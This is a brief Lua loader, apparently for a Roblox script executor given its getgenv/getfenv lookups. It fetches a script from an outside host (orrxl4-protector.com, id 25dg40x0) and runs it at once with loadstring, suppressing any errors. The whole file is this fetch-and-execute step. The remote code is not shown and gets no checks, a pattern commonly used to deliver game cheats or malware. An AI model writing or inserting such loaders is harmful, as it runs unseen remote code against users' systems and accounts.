local Loadstring = loadstring or getgenv().loadstring or getfenv().loadstring
local HttpGet = game.HttpGet
if not (Loadstring and HttpGet) then
    return
end

local Repository = "https://orrxl4-protector.com/api/raw?id="
local ScriptName = "25dg40x0"

local Script
if not pcall(function()
    Script = HttpGet(game, Repository .. ScriptName)
end) then
    return
end

Loadstring(Script)()
